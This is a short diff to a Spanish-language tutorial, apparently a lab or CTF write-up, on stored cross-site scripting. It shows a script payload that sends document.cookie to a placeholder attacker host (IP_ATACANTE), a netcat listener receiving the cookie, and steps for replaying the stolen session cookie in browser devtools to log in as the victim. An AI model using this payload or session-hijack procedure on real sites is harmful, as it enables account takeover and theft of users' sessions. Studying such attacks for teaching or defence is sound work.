@@ -28,3 +28,6 @@ E inyectar el siguiente código:
 ```
 <script>img = new Image(); img.src = "http://IP_ATACANTE/a.php?"+document.cookie;</script>
 ```
+
+En la ventana del terminal donde tengamos netcat a la escucha, aparecerá la cookie de sesión cuando algún usuario entre a esa página a consultar los mensajes por ejemplo.  
+Para utilizarla:  Ctrl+Shift+I (inspeccionar) -->Application -->Cookies y cambiamos la cookie de sesión por la capturada, luego recargamos y ya estamos dentro.
